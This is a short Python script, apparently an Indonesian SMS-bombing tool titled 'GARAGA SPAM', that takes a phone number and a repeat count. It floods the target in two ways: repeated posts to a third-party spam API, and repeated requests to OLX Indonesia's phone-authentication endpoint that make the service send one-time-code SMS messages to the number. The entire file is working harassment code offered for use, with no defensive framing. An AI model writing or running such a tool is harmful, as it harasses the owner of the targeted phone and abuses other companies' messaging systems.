import requests, time

print("""
	[ AUTHOR :MR YUJ1 ]
	    [-GARAGA SPAM-]
""")

num=input("[In] Nomor: ")
jum=int(input("[In] Jumlah: "))

print("\n[RESULT]")
for x in range(jum):
	try:
		req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok",
			data={"number":num})
		if req.json()['status'] == 'ok':
			print(f"{x+1}. Berhasil {num}")
		else:
			print(f"{x+1}. Gagal {num}")
	except Exception as e:
		print(f"{x+1}. Pass: {e}")


print("\n[RESULT2]")
for x in range(jum):
	req=requests.post("https://www.olx.co.id/api/auth/authenticate", json={"grantType":"phone","phone":f"+62{num}","language":"id"}).json()
	if req['status'] == 'PENDING':
		print(f"{x+1}. Berhasil {num}")
	else:
		print(f"{x+1}. Gagal {num}")
	time.sleep(1.5)



